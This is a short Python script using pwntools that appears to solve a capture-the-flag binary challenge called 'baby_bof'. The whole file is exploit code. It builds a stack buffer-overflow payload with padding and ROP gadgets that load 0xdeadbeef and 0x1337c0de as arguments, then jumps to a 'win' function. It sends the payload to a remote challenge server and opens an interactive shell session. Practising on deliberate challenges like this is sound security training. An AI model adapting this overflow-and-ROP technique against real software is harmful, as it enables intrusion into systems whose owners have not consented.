#!/usr/bin/python3

from pwn import *

vuln = ELF('../baby_bof')
padding = b'A' * (60 + 4 + 8)
win = p64(vuln.symbols['win'])

gadget_pop_rdi = p64(0x400783)
gadget_pop_rsi = p64(0x400781)

DEADBEEF = struct.pack('<I', 0xdeadbeef)
LEETCODE = struct.pack('<I', 0x1337c0de)


payload = padding + gadget_pop_rdi + DEADBEEF + DEADBEEF + gadget_pop_rsi + LEETCODE + LEETCODE + b'\x00'*8 + win + b'\n'

with open('payload', 'wb') as f:
    f.write(payload)


conn = remote(host='elfs.owasp.si', port=40003)

s = conn.recvline()
print(s)

conn.send(payload)

s = conn.recvline()
print(s)

s = conn.recvline()
print(s)

s = conn.recvline()
print(s)

s = conn.recvline()
print(s)

conn.interactive()

s = conn.recvline()
print(s)
